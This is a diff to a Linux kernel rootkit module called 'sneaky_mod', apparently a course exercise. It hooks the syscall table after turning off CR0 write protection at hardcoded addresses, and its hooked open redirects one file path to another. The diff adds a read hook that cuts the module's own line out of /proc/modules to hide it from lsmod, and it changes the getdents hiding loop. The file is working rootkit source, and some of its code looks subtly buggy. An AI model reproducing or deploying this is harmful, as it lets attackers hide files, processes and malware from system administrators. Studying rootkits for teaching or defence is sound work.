@@ -18,6 +18,9 @@ struct linux_dirent {
   char d_name[];           /* Filename */
 };
 
+// flag for /proc/modules
+static int module_flag = 0;
+
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 // Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -35,8 +38,8 @@ MODULE_PARM_DESC(pid, "The sneaky_mod pid");
 // Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
 // This is a pointer to the system call table in memory
 // Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
@@ -61,6 +64,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   if (strcmp(pathname, originpath) == 0) {
     copy_to_user(pathname, tempath, strlen(tempath + 1));
   } else if (strcmp(pathname, modpath) == 0) { // lsmod
+    module_flag = 1;
   }
 
   return original_open(pathname, flags);
@@ -92,7 +96,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
       size_t endaddress = (size_t)dirp + totalbytes;
       memmove(curt, next, endaddress - startaddress);
 
-      continue;
+      break;
     }
 
     // move to the next one
@@ -105,7 +109,27 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
 
 /* Own version of read */
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
-  return original_read(fd, buf, count);
+  ssize_t bytes = original_read(fd, buf, count);
+  char * p0 = buf;
+  char * p1 = strstr(buf, "sneaky_mod");
+  char * p2 = p1;
+  
+  if (bytes > 0 && module_flag == 1 && p1 != NULL) {
+    // find chunk for "sneaky_mod"
+    while (*p2 != '\n') {
+      p2++;
+    }
+
+    // update according to position
+    ssize_t remaining = p0 + bytes - 1 - p2;
+    p2++;
+    memmove(p1, p2, remaining);
+
+    ssize_t deduct = (ssize_t)(p2 - p1);
+    bytes -= deduct;
+  }
+
+  return bytes;
 }
 
 // The code that gets executed when the module is loaded
